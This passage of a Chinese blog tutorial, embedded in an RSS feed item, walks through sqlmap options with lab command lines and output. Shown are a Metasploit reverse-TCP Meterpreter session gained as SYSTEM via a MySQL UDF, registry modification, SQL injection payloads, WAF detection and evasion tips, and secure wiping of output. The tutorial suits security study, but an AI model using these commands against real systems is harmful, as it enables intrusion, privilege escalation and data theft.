[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database
underlying
operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
\&amp;amp;gt;
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on
all ports
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
\&amp;amp;gt;
which is the local address? [192.168.136.1]
which local port number do you want to use? [60641]
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
\&amp;amp;gt;
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally,
please wait..
\_
\| \| o
\_ \_ \_ \_ \_\|\_ \__, , \_ \| \| \_\_ \_\|\_
/ \|/ \|/ \| \|/ \| / \| / \\_\|/ \\_\|/ / \\_\| \|
\| \| \|_/\|__/\|_/\\_/\|_/ \\/ \|__/ \|__/\\__/ \|_/\|_/
/\|
\\\|
=[ metasploit v3.7.0-dev [core:3.7 api:1.0]
\+ -- --=[ 674 exploits - 351 auxiliary
\+ -- --=[ 217 payloads - 27 encoders - 8 nops
=[ svn r12272 updated 4 days ago (2011.04.07)
PAYLOAD =\&amp;amp;gt; windows/meterpreter/reverse_tcp
EXITFUNC =\&amp;amp;gt; thread
LPORT =\&amp;amp;gt; 60641
LHOST =\&amp;amp;gt; 192.168.136.1
[\*] Started reverse handler on 192.168.136.1:60641
[\*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF
'sys_bineval',
please wait..
[\*] Sending stage (749056 bytes) to 192.168.136.129
[\*] Meterpreter session 1 opened (192.168.136.1:60641 -\&amp;amp;gt;
192.168.136.129:1689) at Mon Apr 11
hh:mm:52 +0100 2011
meterpreter \&amp;amp;gt; Loading extension espia...success.
meterpreter \&amp;amp;gt; Loading extension incognito...success.
meterpreter \&amp;amp;gt; [-] The 'priv' extension has already been loaded.
meterpreter \&amp;amp;gt; Loading extension sniffer...success.
meterpreter \&amp;amp;gt; System Language : en_US
OS : Windows .NET Server (Build 3790, Service Pack 2).
Computer : W2K3R2
Architecture : x86
Meterpreter : x86/win32
meterpreter \&amp;amp;gt; Server username: NT AUTHORITY\\SYSTEM
meterpreter \&amp;amp;gt; ipconfig
MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0
Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address : 192.168.136.129
Netmask : 255.255.255.0
meterpreter \&amp;amp;gt; exit
[\*] Meterpreter session 1 closed. Reason: User exit&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认情况下MySQL在&lt;code&gt;Windows&lt;/code&gt;上以&lt;code&gt;SYSTEM&lt;/code&gt;权限运行，&lt;code&gt;PostgreSQL&lt;/code&gt;在&lt;code&gt;Windows&lt;/code&gt;与&lt;code&gt;Linux&lt;/code&gt;中是低权限运行，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Microsoft SQL Server 2000&lt;/code&gt;默认是以&lt;code&gt;SYSTEM&lt;/code&gt;权限运行与2008大部分是以&lt;code&gt;NETWORK SERVICE&lt;/code&gt;有时是&lt;code&gt;LOCAL SERVICE&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;对windows注册表操作&quot;&gt;对Windows注册表操作&lt;/h3&gt;
&lt;p&gt;当数据库为&lt;code&gt;MySQL，PostgreSQL&lt;/code&gt;或&lt;code&gt;Microsoft SQL Server&lt;/code&gt;，并且当前web应用支持堆查询。当然，当前连接数据库的用户也需要有权限操作注册表。&lt;/p&gt;
&lt;h4 id=&quot;读取注册表值&quot;&gt;读取注册表值&lt;/h4&gt;
&lt;p&gt;参数：&lt;code&gt;–reg-read&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;写入注册表值&quot;&gt;写入注册表值&lt;/h4&gt;
&lt;p&gt;参数：&lt;code&gt;–reg-add&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;删除注册表值&quot;&gt;删除注册表值&lt;/h4&gt;
&lt;p&gt;参数：&lt;code&gt;–reg-del&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;注册表辅助选项&quot;&gt;注册表辅助选项&lt;/h4&gt;
&lt;p&gt;参数：&lt;code&gt;–reg-key，–reg-value，–reg-data，–reg-type&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;需要配合之前三个参数使用，例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;\$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1
--reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap&quot; --reg-value=Test
--reg-type=REG_SZ --reg-data=1&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;常规参数&quot;&gt;常规参数&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;从sqlite中读取session&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;-s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap&lt;/code&gt;对每一个目标都会在&lt;code&gt;output&lt;/code&gt;路径下自动生成一个&lt;code&gt;SQLite&lt;/code&gt;文件，如果用户想指定读取的文件路径，就可以用这个参数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;保存HTTP(S)日志&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;-t&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个参数需要跟一个文本文件，&lt;code&gt;sqlmap&lt;/code&gt;会把&lt;code&gt;HTTP(S)&lt;/code&gt;请求与响应的日志保存到那里。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;非交互模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;强制使用字符编码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–charset&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;–charset=GBK&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;爬行网站URL&lt;/strong&gt;&lt;br/&gt;参数：&lt;code&gt;–crawl&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap&lt;/code&gt;可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3
[...]
[xx:xx:53] [INFO] starting crawler
[xx:xx:53] [INFO] searching for links with depth 1
[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
[xx:xx:53] [INFO] searching for links with depth 2
[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
[xx:xx:00] [INFO] 42/56 links visited (75%)
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;规定输出到CSV中的分隔符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–csv-del&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当dump保存为CSV格式时&lt;code&gt;（–dump-format=CSV）&lt;/code&gt;，需要一个分隔符默认是逗号，用户也可以改为别的&lt;br/&gt;如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;–csv-del=”;”&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;DBMS身份验证&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–dbms-cred&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，&lt;/p&gt;
&lt;p&gt;可以切换用户如&lt;code&gt;MicrosoftSQL Server的OPENROWSET&lt;/code&gt;函数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;定义dump数据的格式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–dump-format&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输出的格式可定义为：&lt;code&gt;CSV，HTML，SQLITE&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预估完成时间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–eta&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以计算注入数据的剩余时间。&lt;/p&gt;
&lt;p&gt;例如&lt;code&gt;Oracle&lt;/code&gt;的布尔型盲注：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u
&quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot; -b --eta
[...]
[hh:mm:01] [INFO] the back-end DBMS is Oracle
[hh:mm:01] [INFO] fetching banner
[hh:mm:01] [INFO] retrieving the length of query output
[hh:mm:01] [INFO] retrieved: 64
17% [========\&amp;gt; ] 11/64 ETA 00:19&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后：&lt;br/&gt;100% [===================================================] 64/64&lt;br/&gt;[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release&lt;br/&gt;10.2.0.1.0 - Prod&lt;br/&gt;web application technology: PHP 5.2.6, Apache 2.2.9&lt;br/&gt;back-end DBMS: Oracle&lt;br/&gt;banner: 'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'&lt;br/&gt;sqlmap先输出长度，预计完成时间，显示百分比，输出字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;刷新session文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–flush-session&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果不想用之前缓存这个目标的session文件，可以使用这个参数。&lt;br/&gt;会清空之前的session，重新测试该目标。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;自动获取form表单测试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–forms&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过–data参数测试。&lt;br/&gt;但是当使用–forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;忽略在会话文件中存储的查询结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–fresh-queries&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;忽略session文件保存的查询，重新查询。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用DBMS的hex函数&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–hex&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：&lt;/p&gt;
&lt;p&gt;针对&lt;code&gt;PostgreSQL&lt;/code&gt;例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot;
--banner --hex -v 3 --parse-errors
[...]
[xx:xx:14] [INFO] fetching banner
[xx:xx:14] [PAYLOAD] 1 AND
5849=CAST((CHR(58)\|\|CHR(118)\|\|CHR(116)\|\|CHR(106)\|\|CHR(58))\|\|(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION()
AS
CHARACTER(10000)),(CHR(32)))),(CHR(85)\|\|CHR(84)\|\|CHR(70)\|\|CHR(56))),(CHR(72)\|\|CHR(69)\|\|CHR(88))))::text\|\|(CHR(58)\|\|CHR(110)\|\|CHR(120)\|\|CHR(98)\|\|CHR(58))
AS NUMERIC)
[xx:xx:15] [INFO] parsed error message: 'pg_query() [\&amp;lt;a
href='function.pg-query'\&amp;gt;function.pg-query\&amp;lt;/a\&amp;gt;]: Query failed: ERROR: invalid
input syntax for type numeric:
&quot;:vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:&quot;
in \&amp;lt;b\&amp;gt;/var/www/sqlmap/libs/pgsql.inc.php\&amp;lt;/b\&amp;gt; on line \&amp;lt;b\&amp;gt;35\&amp;lt;/b\&amp;gt;'
[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;自定义输出的路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–output-dir&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径&lt;br/&gt;例如：&lt;code&gt;–output-dir=/tmp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;从响应中获取DBMS的错误信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–parse-errors&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;
--parse-errors
[...]
[11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the
time needed to find the right number of query columns. Automatically extending
the range for current UNION query injection technique test
[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10
is out of range of the number of items in the select list.
\&amp;lt;b\&amp;gt;/sqlmap/mssql/iis/get_int.asp, line 27\&amp;lt;/b\&amp;gt;'
[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is
out of range of the number of items in the select list.
\&amp;lt;b\&amp;gt;/sqlmap/mssql/iis/get_int.asp, line 27\&amp;lt;/b\&amp;gt;'
[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is
out of range of the number of items in the select list.
\&amp;lt;b\&amp;gt;/sqlmap/mssql/iis/get_int.asp, line 27\&amp;lt;/b\&amp;gt;'
[11:12:17] [INFO] target URL appears to have 3 columns in query
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;其他的一些参数&quot;&gt;其他的一些参数&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;使用参数缩写&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;-z&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有使用参数太长太复杂，可以使用缩写模式。 例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u
&quot;www.target.com/vuln.php?id=1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以写成：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python sqlmap.py -z &quot;bat,randoma,ign,tec=BEU&quot; -u &quot;www.target.com/vuln.php?id=1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还有：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb
-T users -u &quot;www.target.com/vuln.php?id=1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以写成：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python sqlmap.py -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u
&quot;www.target.com/vuln.php?id=1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;成功SQL注入时警告&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–alert&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设定会发的答案&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–answers&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当希望&lt;code&gt;sqlmap&lt;/code&gt;提出输入时，自动输入自己想要的答案可以使用此参数： 例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u
&quot;http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E
--answers=&quot;extending=N&quot; --batch
[...]
[xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you
want to skip test payloads specific for other DBMSes? [Y/n] Y
[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending
provided level (1) and risk (1)? [Y/n] N
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;发现SQL注入时发出蜂鸣声&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–beep&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发现sql注入时，发出蜂鸣声。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;启发式检测WAF/IPS/IDS保护&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–check-waf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WAF/IPS/IDS&lt;/code&gt;保护可能会对&lt;code&gt;sqlmap&lt;/code&gt;造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。&lt;code&gt;sqlmap&lt;/code&gt;将会使用一个不存在的参数来注入测试&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables
WHERE 2&amp;gt;1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果有保护的话可能返回结果会不同。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;清理sqlmap的UDF(s)和表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–cleanup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;清除sqlmap注入时产生的udf与表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;禁用彩色输出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–disable-coloring&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用指定的Google结果页面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–gpage&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用HTTP参数污染&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;-hpp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;HTTP参数污染可能会绕过&lt;code&gt;WAF/IPS/IDS&lt;/code&gt;保护机制，这个对&lt;code&gt;ASP/IIS与ASP.NET/IIS&lt;/code&gt;平台很有效。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;测试WAF/IPS/IDS保护&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–identify-waf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。&lt;/p&gt;
&lt;p&gt;例如对一个受到ModSecurity WAF保护的MySQL例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;
--identify-waf -v 3
[...]
[xx:xx:23] [INFO] testing connection to the target URL
[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server
(United Security Providers)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application
Firewall (BinarySEC)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web
Application Firewall (NetContinuum/Barracuda Networks)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application
Firewall (art of defence Inc.)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway
(Cisco Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5
Networks)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application
Firewall Enterprise (Teros/Citrix Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions
(Akamai Technologies)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application
Firewall (Incapsula/Imperva)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application
Firewall (CloudFlare)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application
Firewall (Barracuda Networks)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application
Security (IBM)'
[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
[xx:xx:23] [DEBUG] page not found (404)
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application
Firewall (Jiasule)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application
Firewall (AQTRONIX)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source
Web Application Firewall (Trustwave)'
[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web
Application Firewall (Trustwave)'. Please consider usage of tamper scripts
(option '--tamper')
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;模仿智能手机&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–mobile&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有时服务端只接收移动端的访问，此时可以设定一个手机的&lt;code&gt;User-Agent&lt;/code&gt;来模仿手机登陆。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile
[...]
which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
[1] Apple iPhone 4s (default)
[2] BlackBerry 9900
[3] Google Nexus 7
[4] HP iPAQ 6365
[5] HTC Sensation
[6] Nokia N97
[7] Samsung Galaxy S
\&amp;gt; 1
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;安全的删除output目录的文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–purge-output&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py --purge-output -v 3
[...]
[xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
[xx:xx:55] [DEBUG] changing file attributes
[xx:xx:55] [DEBUG] writing random data to files
[xx:xx:55] [DEBUG] truncating files
[xx:xx:55] [DEBUG] renaming filenames to random values
[xx:xx:55] [DEBUG] renaming directory names to random values
[xx:xx:55] [DEBUG] deleting the whole directory tree
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;启发式判断注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–smart&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u
&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;amp;user=foo&amp;amp;id=1&quot; --batch
--smart
[...]
[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might
not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'ca'
[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user'
might not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'user'
[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
[xx:xx:14] [INFO] GET parameter 'id' is dynamic
[xx:xx:14] [WARNING] reflective value(s) found and filtering out
[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be
injectable (possible DBMS: 'MySQL')
[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you
want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to include all tests for 'MySQL' extending provided level (1) and
risk (1)? [Y/n] Y
[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or
HAVING clause' injectable
[xx:xx:14] [INFO] testing 'MySQL \&amp;gt;= 5.0 AND error-based - WHERE or HAVING
clause'
[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL \&amp;gt;= 5.0 AND error-based - WHERE
or HAVING clause' injectable
[xx:xx:14] [INFO] testing 'MySQL inline queries'
[xx:xx:14] [INFO] testing 'MySQL \&amp;gt; 5.0.11 stacked queries'
[xx:xx:14] [INFO] testing 'MySQL \&amp;lt; 5.0.12 stacked queries (heavy query)'
[xx:xx:14] [INFO] testing 'MySQL \&amp;gt; 5.0.11 AND time-based blind'
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL \&amp;gt; 5.0.11 AND time-based blind'
injectable
[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[xx:xx:24] [INFO] automatically extending ranges for UNION query injection
technique tests as there is at least one other potential injection technique
found
[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the
time needed to find the right number of query columns. Automatically extending
the range for current UNION query injection technique test
[xx:xx:24] [INFO] target URL appears to have 3 columns in query
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20
columns' injectable
[...]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;初级用户向导参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–wizard&lt;/code&gt;面向初级用户的参数，可以一步一步教你如何输入针对目标注入。&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;安全牛课堂&lt;code&gt;-kali-linux-web&lt;/code&gt;篇&lt;/p&gt;
&lt;p&gt;sqlmap用户手册中文版：&lt;a href=&quot;https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html&quot; class=&quot;uri&quot;&gt;https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;sqlmap用户手册：&lt;a href=&quot;http://drops.xmd5.com/static/drops/tips-143.html&quot; class=&quot;uri&quot;&gt;http://drops.xmd5.com/static/drops/tips-143.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 26 Oct 2018 04:15:00 +0000</pubDate>
<dc:creator>落花四月</dc:creator>
<og:description>前言 上一篇文章：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/miraitowa/p/9855599.html</dc:identifier>
</item>
<item>
